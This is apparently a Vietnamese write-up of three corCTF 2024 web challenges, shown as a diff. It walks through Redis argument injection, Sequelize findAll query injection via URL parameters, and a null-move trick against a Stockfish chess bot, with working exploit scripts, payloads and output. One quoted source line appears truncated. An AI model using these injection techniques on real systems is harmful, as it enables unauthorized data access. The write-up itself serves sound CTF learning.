+                    &quot;NetworkID&quot;: &quot;26f514ba6e1d52d8bf91331a16cb438b90ce1ae95be9c7cc850bba1b087c345f&quot;,
+                    &quot;EndpointID&quot;: &quot;0fcc5c9e0d7da7a5987376a377439819d5684dc0248d3eb46d5c64b345af1801&quot;,
+                    &quot;Gateway&quot;: &quot;172.18.0.1&quot;,
+                    &quot;IPAddress&quot;: &quot;172.18.0.2&quot;,
+                    &quot;IPPrefixLen&quot;: 16,
+                    &quot;IPv6Gateway&quot;: &quot;&quot;,
+                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,
+                    &quot;GlobalIPv6PrefixLen&quot;: 0,
+                    &quot;DNSNames&quot;: [
+                        &quot;rock-paper-scissors-redis-1&quot;,
+                        &quot;redis&quot;,
+                        &quot;0828e098ad05&quot;
+                    ]
+                }
+            }
+        }
+    }
+]
+</code></pre><ul>
+<li>Ta sẽ tạo username với api <code>/new</code> để xem những gì đã diễn ra nếu ta truyền nhiều đối số với redis.</li>
+</ul>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~$ curl -X POST -H &quot;Content-Type: application/json&quot; -d '{&quot;username&quot;: [&quot;lam&quot;,&quot;\n&quot;, &quot;scoreboard&quot;, 1337, &quot;gaga&quot;]}' http://localhost:8080/new
+OK
+</code></pre><p>poc:</p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/rock-paper-scissors$ python3 exp.py
+corctf{test_flag}
+l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/rock-paper-scissors$ cat exp.py
+import requests
+
+HOST = 'http://localhost:8080'
+sess = requests.Session()
+
+exfil_username = 'mixi'
+r = sess.post(HOST + '/new', json={'username': ['lam', 1337, exfil_username]})
+r = sess.post(HOST + '/play', json={'position': &quot;a&quot;})
+r = sess.post(HOST + '/new', json={'username': exfil_username})
+flag = sess.get(HOST + '/flag').text
+print(flag)
+l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/rock-paper-scissors$
+</code></pre><ul>
+<li>Đây là các hành động mà được redis xử lí khi ta truyền nhiều đối số:</li>
+</ul>
+<pre><code>PS D:\ctf_chall\corCTF2024\rock-paper-scissors&gt; rdcli -h 127.0.0.1 -p 60940
+127.0.0.1:60940&gt;
+127.0.0.1:60940&gt; MONITOR
+OK
+
+127.0.0.1:60940&gt; 1722351217.998199 [0 172.18.0.3:58266] &quot;set&quot; &quot;1ce29c3d35e8be24&quot; &quot;0&quot;
+1722351251.694706 [0 172.18.0.3:58266] &quot;set&quot; &quot;5c653d17782fd9ef&quot; &quot;0&quot;
+1722351258.780213 [0 172.18.0.3:58266] &quot;zrevrange&quot; &quot;scoreboard&quot; &quot;0&quot; &quot;99&quot; &quot;WITHSCORES&quot;
+1722351261.011568 [0 172.18.0.3:58266] &quot;zrevrange&quot; &quot;scoreboard&quot; &quot;0&quot; &quot;99&quot; &quot;WITHSCORES&quot;
+1722351446.656598 [0 172.18.0.3:58266] &quot;set&quot; &quot;d8d255e5554c75d8&quot; &quot;0&quot;
+1722351446.730496 [0 172.18.0.3:58266] &quot;getdel&quot; &quot;d8d255e5554c75d8&quot;
+1722351446.737365 [0 172.18.0.3:58266] &quot;zadd&quot; &quot;scoreboard&quot; &quot;0&quot; &quot;lam&quot; &quot;1337&quot; &quot;mixi&quot;
+1722351446.752457 [0 172.18.0.3:58266] &quot;set&quot; &quot;bf5ec5ad0a5bb51d&quot; &quot;0&quot;
+1722351446.768182 [0 172.18.0.3:58266] &quot;zscore&quot; &quot;scoreboard&quot; &quot;mixi&quot;
+
+</code></pre><p>Đúng như mục đích ta có thể thấy:</p>
+<ul>
+<li>Đầu tiên thì mình tạo user với api <code>/new</code> sau đó server tạo game và lưu vào redis <code>&quot;set&quot; &quot;d8d255e5554c75d8&quot; &quot;0&quot;</code></li>
+<li>Tiếp theo là gọi api <code>/play</code> và để chơi chắc chắn sai thì mình gửi position sai -&gt; lúc này redis sẽ gọi method <code>getdel</code> <code>&quot;getdel&quot; &quot;d8d255e5554c75d8&quot;</code> -&gt; sau đó gọi <code>zadd</code>: <code>&quot;zadd&quot; &quot;scoreboard&quot; &quot;0&quot; &quot;lam&quot; &quot;1337&quot; &quot;mixi&quot;</code> -&gt; lúc này thì username <code>mixi</code> đã được add với score là 1337 vào <code>sorted set &quot;scoreboard&quot;</code>.
+<img src="https://hackmd.io/_uploads/rJ7mmFIKA.png" alt="image"></li>
+</ul>
+<h3 id="exploit-real-server">exploit real server</h3>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/rock-paper-scissors$ python3 exp.py
+corctf{lizard_spock!_a8cd3ad8ee2cde42}
+</code></pre><h3 id="notes">Notes</h3>
+<ul>
+<li>Sau bài này mình mới rút ra một vài lỗi analysis của mình là sorted set &ldquo;scoreboard&rdquo; mới là để kiểm tra khi lấy flag chứ không phải kiểm tra điểm của game.</li>
+<li>Vấn đề đọc chưa kĩ flow là server tạo game -&gt; user chơi game -&gt; điểm của game đó sẽ được add vào <code>scoreboard</code> trong redis chứ không phải là lấy điểm cao nhất của user và cộng vào.</li>
+</ul>
+<p>flag: <code>corctf{lizard_spock!_a8cd3ad8ee2cde42}</code></p>
+<h2 id="erm-60-solves">erm [60 solves]</h2>
+<p><img src="https://hackmd.io/_uploads/HJ3UtY8KA.png" alt="image"></p>
+<ul>
+<li>Đến với một chall nodejs + orm Sequelize + sqlite database.</li>
+</ul>
+<p>Vì đề bài cho source nên ta sẽ đi phân tích luôn các api của server.</p>
+<h3 id="analysis-1">analysis</h3>
+<pre><code>const express = require(&quot;express&quot;);
+const hbs = require(&quot;hbs&quot;);
+
+const app = express();
+
+const db = require(&quot;./db.js&quot;);
+
+const PORT = process.env.PORT || 5000;
+
+app.set(&quot;view engine&quot;, &quot;hbs&quot;);
+
+// catches async errors and forwards them to error handler
+// https://stackoverflow.com/a/51391081
+const wrap = fn =&gt; (req, res, next) =&gt; {
+    return Promise
+        .resolve(fn(req, res, next))
+        .catch(next);
+};
+
+app.get(&quot;/api/members&quot;, wrap(async (req, res) =&gt; {
+    res.json({ members: (await db.Member.findAll({ include: db.Category, where: { kicked: false } })).map(m =&gt; m.toJSON()) });
+}));
+
+app.get(&quot;/api/writeup/:slug&quot;, wrap(async (req, res) =&gt; {
+    const writeup = await db.Writeup.findOne({ where: { slug: req.params.slug }, include: db.Member });
+    if (!writeup) return res.status(404).json({ error: &quot;writeup not found&quot; });
+    res.json({ writeup: writeup.toJSON() });
+}));
+
+app.get(&quot;/api/writeups&quot;, wrap(async (req, res) =&gt; {
+    res.json({ writeups: (await db.Writeup.findAll(req.query)).map(w =&gt; w.toJSON()).sort((a,b) =&gt; b.date - a.date) });
+}));
+
+app.get(&quot;/writeup/:slug&quot;, wrap(async (req, res) =&gt; {
+    res.render(&quot;writeup&quot;);
+}));
+
+app.get(&quot;/writeups&quot;, wrap(async (req, res) =&gt; res.render(&quot;writeups&quot;)));
+
+app.get(&quot;/members&quot;, wrap(async (req, res) =&gt; res.render(&quot;members&quot;)));
+
+app.get(&quot;/&quot;, (req, res) =&gt; res.render(&quot;index&quot;));
+
+app.use((err, req, res, next) =&gt; {
+    console.log(err);
+    res.status(500).send('An error occurred');
+});
+
+app.listen(PORT, () =&gt; console.log(`web/erm listening on port ${PORT}`));
+</code></pre><ul>
+<li>
+<p>Trang web khá <code>cầu kì</code> dùng để hiển thị member + writeup cho team chơi CTF khá phổ biến có sử dụng template handlerbar.</p>
+</li>
+<li>
+<p>Như ta thấy ở trên thì <code>/</code> sẽ hiển thị trang index,<code>/members</code> sẽ hiển thị <code>members</code> và trong này lại gọi api <code>/api/members</code> để hiển thị các member của team trừ thành viên đã bị <code>kicked</code>, <code>/writeups</code> tương tự sẽ gọi api <code>/api/writeups</code> để hiên thị danh sách tất cả các write up qua các giải CTF, <code>/writeup/:slug</code> sẽ hiển thị writeup detail qua việc gọi <code>/api/writeup/:slug</code></p>
+</li>
+<li>
+<p>Vậy thì để ý FLAG trước đã -&gt; flag nằm ở <code>db.js</code> đây là nơi init các method và truy vấn liên quan đến database.</p>
+</li>
+</ul>
+<pre><code>    const { Sequelize, DataTypes, Op } = require('sequelize');
+    const slugify = require('slugify');
+    const { rword } = require('rword');
+
+    const sequelize = new Sequelize({
+        dialect: 'sqlite',
+        storage: 'erm.db',
+        logging: false
+    });  
+
+    const Category = sequelize.define('Category', {
+        name: {
+            type: DataTypes.STRING,
+            primaryKey: true,
+            allowNull: false,
+        }
+    });
+
+    const Member = sequelize.define('Member', {
+        username: {
+            type: DataTypes.STRING,
+            primaryKey: true,
+            allowNull: false,
+        },
+        secret: {
+            type: DataTypes.STRING,
+        },
+        kicked: {
+            type: DataTypes.BOOLEAN,
+            defaultValue: false,
+        }
+    });
+
+    const Writeup = sequelize.define('Writeup', {
+        title: {
+            type: DataTypes.STRING,
+            allowNull: false
+        },
+        slug: {
+            type: DataTypes.STRING,
+            allowNull: false,
+        },
+        content: {
+            type: DataTypes.TEXT,
+            allowNull: false
+        },
+        date: {
+            type: DataTypes.DATE,
+            allowNull: false
+        },
+        category: {
+            type: DataTypes.STRING,
+        }
+    });
+
+    Category.belongsToMany(Member, { through: 'MemberCategory' });
+    Member.belongsToMany(Category, { through: 'MemberCategory' });
+    Member.hasMany(Writeup);
+    Writeup.belongsTo(Member);
+
+    sequelize.sync().then(async () =&gt; {
+        const writeupCount = await Writeup.count();
+        if (writeupCount !== 0) return;
+        console.log(&quot;seeding db with default data...&quot;);
+
+        const categories = [&quot;web&quot;, &quot;pwn&quot;, &quot;rev&quot;, &quot;misc&quot;, &quot;crypto&quot;, &quot;forensics&quot;];
+        const members = [
+            { username: &quot;FizzBuzz101&quot;, categories: [&quot;pwn&quot;, &quot;rev&quot;] },
+            { username: &quot;strellic&quot;, categories: [&quot;web&quot;, &quot;misc&quot;] },
+            { username: &quot;EhhThing&quot;, categories: [&quot;web&quot;, &quot;misc&quot;] },
+            { username: &quot;drakon&quot;, categories: [&quot;web&quot;, &quot;misc&quot;], },
+            { username: &quot;ginkoid&quot;, categories: [&quot;web&quot;, &quot;misc&quot;], },
+            { username: &quot;jazzpizazz&quot;, categories: [&quot;web&quot;, &quot;misc&quot;], },
+            { username: &quot;BrownieInMotion&quot;, categories: [&quot;web&quot;, &quot;rev&quot;] },
+            { username: &quot;clubby&quot;, categories: [&quot;pwn&quot;, &quot;rev&quot;] },
+            { username: &quot;pepsipu&quot;, categories: [&quot;pwn&quot;, &quot;crypto&quot;] },
+            { username: &quot;chop0&quot;, categories: [&quot;pwn&quot;] },
+            { username: &quot;ryaagard&quot;, categories: [&quot;pwn&quot;] },
+            { username: &quot;day&quot;, categories: [&quot;pwn&quot;, &quot;crypto&quot;] },
+            { username: &quot;willwam845&quot;, categories: [&quot;crypto&quot;] },
+            { username: &quot;quintec&quot;, categories: [&quot;crypto&quot;, &quot;misc&quot;] },
+            { username: &quot;anematode&quot;, categories: [&quot;rev&quot;] },
+            { username: &quot;0x5a&quot;, categories: [&quot;pwn&quot;] },
+            { username: &quot;emh&quot;, categories: [&quot;crypto&quot;] },
+            { username: &quot;jammy&quot;, categories: [&quot;misc&quot;, &quot;forensics&quot;] },
+            { username: &quot;pot&quot;, categories: [&quot;crypto&quot;] },
+            { username: &quot;plastic&quot;, categories: [&quot;misc&quot;, &quot;forensics&quot;] },
+        ];
+
+        for (const category of categories) {
+            await Category.create({ name: category });
+        }
+
+        for (const member of members) {
+            const m = await Member.create({ username: member.username });
+            for (const category of member.categories) {
+                const c = await Category.findOne({ where: { name: category } });
+                await m.addCategory(c);
+                await c.addMember(m);
+            }
+        }
+
+        // the forbidden member
+        // banned for leaking our solve scripts
+        const goroo = await Member.create({ username: &quot;goroo&quot;, secret: process.env.FLAG || &quot;corctf{test_flag}&quot;, kicked: true });
+        const web = await Category.findOne({ where: { name: &quot;web&quot; } });
+        await goroo.addCategory(web);
+        await web.addMember(    );
+
+        for (let i = 0; i &lt; 25; i++) {
+            const challCategory = categories[Math.floor(Math.random() * categories.length)];
+            const date = new Date(Math.floor(Math.random() * 4) + 2020, Math.floor(Math.random() * 12), Math.floor(Math.random() * 31) + 1);
+
+            // most CTFs feel like they're just named with random words anyway
+            const ctfName = `${rword.generate(1, { capitalize: 'first', length: '4-6' })}CTF ${date.getFullYear()}`;
+            // same thing with challenge names
+            const challName = `${challCategory}/${rword.generate(1)}`;
+
+            const title = `${ctfName} - ${challName} Writeup`;
+            const content = rword.generate(1, { capitalize: 'first'}) + &quot; &quot; + rword.generate(500).join(&quot; &quot;) + &quot;.&lt;br /&gt;&lt;br /&gt;Thanks for reading!&lt;br /&gt;&lt;br /&gt;&quot;;
+            
+            const writeup = await Writeup.create({ title, content, date, slug: slugify(title, { lower: true }), category: challCategory });
+            const authors = members.filter(m =&gt; m.categories.includes(challCategory));
+            const author = await Member.findByPk(authors[Math.floor(Math.random() * authors.length)].username);
+
+            await writeup.setMember(author);
+            await author.addWriteup(writeup);
+        }
+    });
+
+    module.exports = { Category, Member, Writeup };
+</code></pre><pre><code>- Với orm sequelize server khởi tạo bảng `Categorys` chứa tên các mảng trong CTF, `Members` chứa member, `Writeups` chứa các write up của team -&gt; khởi tạo các relationship tương ứng -&gt; tiếp sau đó insert các member sau đó tạo ra write-up random.
+</code></pre>
+<ul>
+<li>Và flag là secret của user goroo là flag:</li>
+</ul>
+<pre><code>const goroo = await Member.create({ username: &quot;goroo&quot;, secret: process.env.FLAG || &quot;corctf{test_flag}&quot;, kicked: true });
+        const web = await Category.findOne({ where: { name: &quot;web&quot; } });
+        await goroo.addCategory(web);
+        await web.addMember(goroo);
+</code></pre><ul>
+<li>
+<p>ở đây <code>kicked</code> là true vì vậy cho nên ta có thể hiểu được lí do khi api member lại không có user này.</p>
+</li>
+<li>
+<p>Có 2 api mà chúng ta có thể truyền đầu vào ở 2 api này:</p>
+</li>
+</ul>
+<pre><code>app.get(&quot;/api/writeup/:slug&quot;, wrap(async (req, res) =&gt; {
+    const writeup = await db.Writeup.findOne({ where: { slug: req.params.slug }, include: db.Member });
+    if (!writeup) return res.status(404).json({ error: &quot;writeup not found&quot; });
+    res.json({ writeup: writeup.toJSON() });
+}));
+
+app.get(&quot;/api/writeups&quot;, wrap(async (req, res) =&gt; {
+    res.json({ writeups: (await db.Writeup.findAll(req.query)).map(w =&gt; w.toJSON()).sort((a,b) =&gt; b.date - a.date) });
+}));
+</code></pre><h3 id="exploit">exploit</h3>
+<ul>
+<li>Chú ý điểm nổi bật là ở <code>/api/writeups</code> tại sao lại truyền cả req.query vào method của sequelize và anh Hậu và anh Nam đã tìm ra solution cho chall này theo như trong doc này <a href="https://sequelize.org/api/v6/class/src/model.js~model#static-method-findAll">link</a></li>
+</ul>
+<p>poc: <code>include[all]=All&amp;include[where][username]=goroo&amp;include[or]=1</code> ở đây điều kiện là sẽ bao gồm tất cả các relationship liên quan đến bảng Writeups với điều kiện là username = <code>goroo</code> và mấu chốt ở đây là ta sẽ chuyển điều kiện or:</p>
+<p><img src="https://hackmd.io/_uploads/HkrjIi8t0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S18PujUKC.png" alt="image"></p>
+<ul>
+<li>
+<p>ở đây thì or 1 là true sẽ luôn đúng và trả ra kết quả.</p>
+</li>
+<li>
+<p>Hoặc ở đây ta sẽ dùng điều kiện on sẽ check điều kiện kicked là true và lọc ra user <code>goroo</code>:
+<img src="https://hackmd.io/_uploads/SJDEPoIt0.png" alt="image"></p>
+</li>
+</ul>
+<p><code>/api/writeups?include[all]=All&amp;include[on][kicked]=1</code></p>
+<p><img src="https://hackmd.io/_uploads/HJvmujUFA.png" alt="image"></p>
+<p>flag: <code>corctf{erm?_more_like_orm_amiright?}</code></p>
+<h2 id="msfrogofwar3">msfrogofwar3</h2>
+<ul>
+<li>Một ứng dụng play chess realtime với bot sử dụng <code>stockfish</code> và socketIO với flask.</li>
+<li>Theo như tìm hiểu thì stockfish là một engine cờ vua khá phổ biến hiện nay dùng để phân tích và chơi cờ vua để đưa ra những nước đi một cách tốt nhất và ở chương trình này thì nó là bot và sẽ chơi với mình.</li>
+</ul>
+<h3 id="analyst">analyst</h3>
+<ul>
+<li>Bây giờ thì ta sẽ đi vào phân tích logic của mã nguồn đang chạy:</li>
+</ul>
+<pre><code>from flask import Flask, request, render_template
+from flask_socketio import SocketIO, emit
+from stockfish import Stockfish
+import random
+import chess
+
+games = {}
+
+toxic_msges = [
+    &quot;?&quot;,
+    &quot;rip bozo&quot;,
+    &quot;so bad lmfaoo&quot;,
+    &quot;ez&quot;,
+    &quot;skill issue&quot;,
+    &quot;mad cuz bad&quot;,
+    &quot;hold this L&quot;,
+    &quot;L + ratio + you fell off&quot;,
+    &quot;i bet your main category is stego&quot;,
+    &quot;have you tried alt+f4?&quot;,
+    &quot;🤡🤡🤡&quot;
+]
+
+win_msges = [
+    &quot;lmaooooooooo ur so bad&quot;,
+    &quot;was that it?&quot;,
+    &quot;zzzzzzzzzzzzzzzzzzzzzz&quot;,
+    &quot;hopefully the next game wont be so quick&quot;,
+    &quot;nice try - jk that was horrible&quot;,
+    &quot;this aint checkers man&quot;
+]
+
+TURN_LIMIT = 15
+STOCKFISH_DEPTH = 21
+FLAG = &quot;corctf{this_is_a_fake_flag}&quot;
+
+class GameWrapper:
+    def __init__(self, emit):
+        self.emit = emit
+        self.board = chess.Board(chess.STARTING_FEN)
+        self.moves = []
+        self.player_turn = True
+
+    def get_player_state(self):
+        legal_moves = [f&quot;{m}&quot; for m in self.board.legal_moves] if self.player_turn and self.board.fullmove_number &lt; TURN_LIMIT else []
+
+        status = &quot;running&quot;
+        if self.board.fullmove_number &gt;= TURN_LIMIT:
+            status = &quot;turn limit&quot;
+
+        if outcome := self.board.outcome():
+            if outcome.winner is None:
+                status = &quot;draw&quot;
+            else:
+                status = &quot;win&quot; if outcome.winner == chess.WHITE else &quot;lose&quot;
+
+        return {
+            &quot;pos&quot;: self.board.fen(),
+            &quot;moves&quot;: legal_moves,
+            &quot;your_turn&quot;: self.player_turn,
+            &quot;status&quot;: status,
+            &quot;turn_counter&quot;: f&quot;{self.board.fullmove_number} / {TURN_LIMIT} turns&quot;
+        }
+
+    def play_move(self, uci):
+        if not self.player_turn:
+            return
+        if self.board.fullmove_number &gt;= TURN_LIMIT:
+            return
+        
+        self.player_turn = False
+
+        outcome = self.board.outcome()
+        if outcome is None:
+            try:
+                move = chess.Move.from_uci(uci)
+                if move:
+                    if move not in self.board.legal_moves:
+                        self.player_turn = True
+                        self.emit('state', self.get_player_state())
+                        self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;System&quot;, &quot;msg&quot;: &quot;Illegal move&quot;})
+                        return
+                    self.board.push_uci(uci)
+            except:
+                self.player_turn = True
+                self.emit('state', self.get_player_state())
+                self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;System&quot;, &quot;msg&quot;: &quot;Invalid move format&quot;})
+                return
+        elif outcome.winner != chess.WHITE:
+            self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;🐸&quot;, &quot;msg&quot;: &quot;you lost, bozo&quot;})
+            return
+
+        self.moves.append(uci)
+
+        # stockfish has a habit of crashing
+        # The following section is used to try to resolve this
+        opponent_move, attempts = None, 0
+        while not opponent_move and attempts &lt;= 10:
+            try:
+                attempts += 1
+                engine = Stockfish(&quot;./stockfish/stockfish-ubuntu-x86-64-avx2&quot;, parameters={&quot;Threads&quot;: 4}, depth=STOCKFISH_DEPTH)
+                for m in self.moves:
+                    if engine.is_move_correct(m):
+                        engine.make_moves_from_current_position([m])
+                opponent_move = engine.get_best_move_time(3_000)
+            except:
+                pass
+
+        if opponent_move != None:
+            self.moves.append(opponent_move)
+            opponent_move = chess.Move.from_uci(opponent_move)
+            if self.board.is_capture(opponent_move):
+                self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;🐸&quot;, &quot;msg&quot;: random.choice(toxic_msges)})
+            self.board.push(opponent_move)
+            self.player_turn = True
+            self.emit(&quot;state&quot;, self.get_player_state())
+
+            if (outcome := self.board.outcome()) is not None:
+                if outcome.termination == chess.Termination.CHECKMATE:
+                    if outcome.winner == chess.BLACK:
+                        self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;🐸&quot;, &quot;msg&quot;: &quot;Nice try... but not good enough 🐸&quot;})
+                    else:
+                        self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;🐸&quot;, &quot;msg&quot;: &quot;how??????&quot;})
+                        self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;System&quot;, &quot;msg&quot;: FLAG})
+                else: # statemate, insufficient material, etc
+                    self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;🐸&quot;, &quot;msg&quot;: &quot;That was close... but still not good enough 🐸&quot;})
+        else:
+            self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;System&quot;, &quot;msg&quot;: &quot;An error occurred, please restart&quot;})
+
+app = Flask(__name__, static_url_path='', static_folder='static')
+socketio = SocketIO(app, cors_allowed_origins='*')
+
+@app.after_request
+def add_header(response):
+    response.headers['Cache-Control'] = 'max-age=604800'
+    return response
+
+@app.route('/')
+def index_route():
+    return render_template('index.html')
+
+@socketio.on('connect')
+def on_connect(_):
+    games[request.sid] = GameWrapper(emit)
+    emit('state', games[request.sid].get_player_state())
+
+@socketio.on('disconnect')
+def on_disconnect():
+    if request.sid in games:
+        del games[request.sid]
+
+@socketio.on('move')
+def onmsg_move(move):
+    try:
+        games[request.sid].play_move(move)
+    except:
+        emit(&quot;chat&quot;, {&quot;name&quot;: &quot;System&quot;, &quot;msg&quot;: &quot;An error occurred, please restart&quot;})
+
+@socketio.on('state')
+def onmsg_state():
+    emit('state', games[request.sid].get_player_state())
+</code></pre><ul>
+<li>
+<p>Sử dụng socketIO để connect với server -&gt; ở đây là mỗi người chơi sẽ có một session riêng và nếu emit <code>move</code> -&gt; thì sẽ gọi phương thức play_move được khởi tạo từ class <code>GameWrapper</code>
+Cùng phân tích sâu một chút class này:</p>
+</li>
+<li>
+<p>khi khởi tạo một đối tượng sẽ khởi tạo các giá trị emit , board , move là vị trí, player_tern = true tức là đầu tiên người chơi sẽ được di chuyển trước.
+Quan sát phương thức <code>play_move</code> được gọi khi client emit <code>move</code>:</p>
+</li>
+<li>
+<p>Yêu cầu phải đang lượt của người chơi mới được thực thi và nếu quá 15 lượt thì sẽ không được di chuyển (tức là thua) và ván cờ chưa kết thúc.</p>
+</li>
+<li>
+<p><code>move = chess.Move.from_uci(uci)</code> sử dụng trong Python là để tạo một đối tượng Move từ một chuỗi UCI (Universal Chess Interface) đại diện cho một nước đi trong cờ vua là giá trị của move mà ta emit kiểm tra nếu nước đi có hợp lệ hay không nếu mà không thì trả ra tin <code>msg&quot;: &quot;Illegal move</code> còn nếu hợp lệ thì đẩy nước đi vào trong bảng cờ.</p>
+</li>
+<li>
+<p>Và nếu mình thua -&gt; tức là quân trắng thua thì gửi tin <code>msg&quot;: &quot;you lost, bozo&quot;</code></p>
+</li>
+</ul>
+<pre><code>opponent_move, attempts = None, 0
+        while not opponent_move and attempts &lt;= 10:
+            try:
+                attempts += 1
+                engine = Stockfish(&quot;./stockfish/stockfish-ubuntu-x86-64-avx2&quot;, parameters={&quot;Threads&quot;: 4}, depth=STOCKFISH_DEPTH)
+                for m in self.moves:
+                    if engine.is_move_correct(m):
+                        engine.make_moves_from_current_position([m])
+                opponent_move = engine.get_best_move_time(3_000)
+            except:
+                pass
+</code></pre><ul>
+<li>Vòng lặp trên sẽ lấy nước đi tốt nhất nếu mà không thành công sau 10 lần trả ra lỗi -&gt; nếu tìm ra nó sẽ di chuyển theo nước tại uci đó.</li>
+</ul>
+<p>Kiểm tra kết thúc ván cờ:</p>
+<ul>
+<li>
+<p>if (outcome := self.board.outcome()) is not None:: Kiểm tra xem ván cờ đã kết thúc chưa.</p>
+</li>
+<li>
+<p>if outcome.termination == chess.Termination.CHECKMATE:: Nếu ván cờ kết thúc bằng chiếu hết.</p>
+</li>
+<li>
+<p>if outcome.winner == chess.BLACK:: Nếu đối thủ thắng (Stockfish là quân đen), gửi thông báo &ldquo;Nice try&hellip; but not good enough 🐸&rdquo;.</p>
+</li>
+<li>
+<p>else:: Nếu người chơi thắng, gửi thông báo &ldquo;how??????&rdquo; và có thể thêm FLAG.</p>
+</li>
+<li>
+<p>else:: Nếu ván cờ kết thúc với một kết quả khác (hòa,..), gửi thông báo &ldquo;That was close&hellip; but still not good enough 🐸&rdquo;.</p>
+</li>
+<li>
+<p>Có thể thấy yêu cầu là chúng ta phải thắng stockfish sau 15 lượt trở xuống -&gt; liệu điều này có khả thi khi mà chúng ta chơi khá là nghiệp dư.</p>
+</li>
+</ul>
+<h3 id="solution1">solution1</h3>
+<ul>
+<li>Theo stockfish thì uci <code>0000</code> là một nước đi hợp lí trong cờ vua và nếu người chơi đi nước này thì stockfish sẽ nghĩ nước tiếp theo dành cho quân đi nước này -&gt; ta sẽ lợi dụng việc này để trở thành người đi quân đen và stockfish đi quân trắng -&gt; theo như hàm check thì ta thấy:</li>
+</ul>
+<pre><code>if (outcome := self.board.outcome()) is not None:
+                if outcome.termination == chess.Termination.CHECKMATE:
+                    if outcome.winner == chess.BLACK:
+                        self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;🐸&quot;, &quot;msg&quot;: &quot;Nice try... but not good enough 🐸&quot;})
+                    else:
+                        self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;🐸&quot;, &quot;msg&quot;: &quot;how??????&quot;})
+                        self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;System&quot;, &quot;msg&quot;: FLAG})
+                else: # statemate, insufficient material, etc
+                    self.emit(&quot;chat&quot;, {&quot;name&quot;: &quot;🐸&quot;, &quot;msg&quot;: &quot;That was close... but still not good enough 🐸&quot;})
+</code></pre><ul>
+<li>Chương trình sẽ kiểm tra xem bên thắng nếu là trắng thì sẽ nhận được flag -&gt; vậy thì bây giờ thật dễ dàng cho chúng ta đánh thua bot trong dưới 15 nước bằng việc di chuyển vua để bot chiếu hết nhanh nhất -&gt; và có nhiều cách để di chuyển.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rya2u8cFR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1NmCS5F0.png" alt="image"></p>
+<p>poc:</p>
+<pre><code>import socketio
+import time
+
+sio = socketio.Client()
+
+moves = [&quot;0000&quot;, &quot;e7e5&quot;, &quot;e8e7&quot;, &quot;e7d6&quot;, &quot;d6c5&quot;, &quot;c5d4&quot;, &quot;d4d3&quot;]
+
+GLOB_IDX = 0
+
+@sio.event
+def connect():
+    print(&quot;Connected to server&quot;)
+    sio.emit('state')
+
+@sio.event
+def disconnect():
+    print(&quot;Disconnected from server&quot;)
+
+@sio.event
+def state(data):
+    global GLOB_IDX
+    print(&quot;Current state:&quot;)
+    print(data)
+    try:
+        if data['your_turn']:
+            print(&quot;SENDING&quot;, moves[GLOB_IDX])
+            sio.emit(&quot;move&quot;, moves[GLOB_IDX])
+            GLOB_IDX += 1
+    except IndexError:
+        print(&quot;PRINTING EVIL&quot;)
+
+@sio.event
+def chat(data):
+    if data[&quot;msg&quot;] == &quot;:frog:: how??????&quot;:
+        print(&quot;PRINTING EVIL&quot;)
+    print(f&quot;{data['name']}: {data['msg']}&quot;)
+
+SERVER_URL = 'http://localhost:8000/'
+sio.connect(SERVER_URL)
+
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    print(&quot;Client interrupted&quot;)
+
+sio.disconnect()
+</code></pre><pre><code>l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/frogmisc$ python3 sol.py
+websocket-client package not installed, only polling transport is available
+Current state:
+{'pos': 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1', 'moves': ['g1h3', 'g1f3', 'b1c3', 'b1a3', 'h2h3', 'g2g3', 'f2f3', 'e2e3', 'd2d3', 'c2c3', 'b2b3', 'a2a3', 'h2h4', 'g2g4', 'f2f4', 'e2e4', 'd2d4', 'c2c4', 'b2b4', 'a2a4'], 'your_turn': True, 'status': 'running', 'turn_counter': '1 / 15 turns'}
+SENDING 0000
+Connected to server
+Current state:
+{'pos': 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1', 'moves': [], 'your_turn': False, 'status': 'running', 'turn_counter': '1 / 15 turns'}
+Current state:
+{'pos': 'rnbqkbnr/pppppppp/8/8/4P3/8/PPPP1PPP/RNBQKBNR b KQkq - 0 1', 'moves': ['g8h6', 'g8f6', 'b8c6', 'b8a6', 'h7h6', 'g7g6', 'f7f6', 'e7e6', 'd7d6', 'c7c6', 'b7b6', 'a7a6', 'h7h5', 'g7g5', 'f7f5', 'e7e5', 'd7d5', 'c7c5', 'b7b5', 'a7a5'], 'your_turn': True, 'status': 'running', 'turn_counter': '1 / 15 turns'}
+SENDING e7e5
+Current state:
+{'pos': 'rnbqkbnr/pppp1ppp/8/4p3/4P3/5N2/PPPP1PPP/RNBQKB1R b KQkq - 1 2', 'moves': ['g8e7', 'g8h6', 'g8f6', 'f8e7', 'f8d6', 'f8c5', 'f8b4', 'f8a3', 'e8e7', 'd8e7', 'd8f6', 'd8g5', 'd8h4', 'b8c6', 'b8a6', 'h7h6', 'g7g6', 'f7f6', 'd7d6', 'c7c6', 'b7b6', 'a7a6', 'h7h5', 'g7g5', 'f7f5', 'd7d5', 'c7c5', 'b7b5', 'a7a5'], 'your_turn': True, 'status': 'running', 'turn_counter': '2 / 15 turns'}
+SENDING e8e7
+🐸: ez
+Current state:
